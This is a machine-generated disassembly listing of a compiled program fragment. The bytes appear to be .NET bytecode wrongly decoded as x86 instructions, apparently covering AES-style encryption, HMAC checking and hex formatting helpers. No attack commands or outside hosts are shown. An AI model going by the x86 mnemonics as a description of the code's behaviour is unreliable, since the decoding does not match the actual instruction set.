  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 c0             	add    %dh,-0x40(%edx)
  4042d8:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 ee             	add    %dh,-0x12(%edx)
  40436b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	44                   	inc    %esp
  404507:	27                   	daa
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 4a    	or     %dl,0x4a72060d(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 5a    	or     %dl,0x5a72060d(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
